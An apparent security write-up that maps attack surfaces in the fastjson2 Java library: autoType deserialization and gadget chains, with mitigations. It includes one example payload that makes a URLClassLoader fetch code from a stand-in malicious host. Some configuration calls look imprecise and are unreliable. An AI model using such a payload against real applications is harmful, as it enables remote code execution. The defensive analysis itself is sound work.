# Attack Surface Analysis for alibaba/fastjson2

## Attack Surface: [1. Unsafe Deserialization via `autoType`](./attack_surfaces/1__unsafe_deserialization_via__autotype_.md)

*   **Description:** Exploiting the `autoType` feature of `fastjson2` to instantiate arbitrary classes during deserialization, leading to Remote Code Execution (RCE) or other critical vulnerabilities. This occurs when `fastjson2` processes JSON input that specifies class types using the `@type` key without proper restrictions.
*   **fastjson2 Contribution:** `fastjson2`'s implementation of `autoType` allows for dynamic class instantiation based on the `@type` field in the JSON input. This feature, if enabled or not strictly controlled, directly enables attackers to influence which classes are loaded and instantiated by `fastjson2`.
*   **Example:** An attacker crafts a JSON payload containing `{"@type":"java.net.URLClassLoader", "url":"http://malicious.server/evil.jar"}` and sends it to an application endpoint that uses `fastjson2.parseObject()` with `autoType` enabled. `fastjson2` attempts to deserialize this, potentially loading and executing malicious code from the provided URL by instantiating `java.net.URLClassLoader`.
*   **Impact:** Remote Code Execution (RCE), allowing complete control over the application server.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **Disable `autoType` globally.** This is the most effective mitigation if `autoType` is not a required feature. Configure `ParserConfig.getGlobalAutoTypeBeforeHandler().config(AutoTypeBeforeHandler.DenyAllAutoTypeBeforeHandler.instance);` or similar mechanism to disable it.
    *   **Implement a strict whitelist for `autoType`.** If `autoType` is necessary, define a very limited and carefully reviewed set of allowed classes that can be deserialized via `autoType`. Use `TypeUtils.loadClass(className, classLoader, denyList)` with a robust `denyList` or implement a custom `AutoTypeBeforeHandler` for fine-grained control.
    *   **Avoid using `parseObject` or `parseArray` directly on untrusted input without type specification.** When possible, use `fastjson2.parseObject(jsonString, ExpectedClass.class)` or `fastjson2.parseObject(jsonString, new TypeReference<ExpectedClass>(){})` to enforce expected types and bypass `autoType` for untrusted data.

## Attack Surface: [2. Deserialization Gadget Chains](./attack_surfaces/2__deserialization_gadget_chains.md)

*   **Description:**  Leveraging existing "gadget chains" within the application's classpath or Java runtime environment to achieve code execution through `fastjson2`'s deserialization process. Even with some `autoType` restrictions, vulnerabilities can arise if `fastjson2` triggers vulnerable code paths during deserialization of seemingly benign classes.
*   **fastjson2 Contribution:** `fastjson2`'s deserialization logic can inadvertently trigger method invocations within classes during object construction and property setting. If vulnerable "gadget chain" classes are present in the application's dependencies, `fastjson2` can be manipulated to initiate these chains.
*   **Example:** An application includes a vulnerable library with known deserialization gadgets (e.g., certain versions of common libraries). An attacker crafts a JSON payload that, when deserialized by `fastjson2`, causes the instantiation and property setting of objects in a specific order, triggering a chain of method calls within the vulnerable library that ultimately leads to code execution. This can happen even if `autoType` is partially restricted, as the initial deserialized classes might be allowed, but their internal operations trigger the gadget chain.
*   **Impact:** Remote Code Execution (RCE), potentially bypassing `autoType` restrictions.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Dependency Security Audits and Updates.** Regularly scan application dependencies for known vulnerabilities, including deserialization gadgets. Update vulnerable libraries to patched versions promptly. Use dependency scanning tools to automate this process.
    *   **Principle of Least Privilege for Dependencies.** Minimize the number of dependencies and only include necessary libraries to reduce the attack surface from third-party code. Carefully review and justify each dependency.
    *   **Runtime Security Monitoring and Intrusion Detection.** Implement runtime security monitoring to detect and potentially block suspicious deserialization activity, such as attempts to instantiate known gadget chain classes or unusual object creation patterns.
    *   **Consider using a security manager or similar sandboxing mechanisms.** While complex to implement, these can provide an additional layer of defense by restricting the capabilities of deserialized code and limiting the impact of gadget chain exploitation.

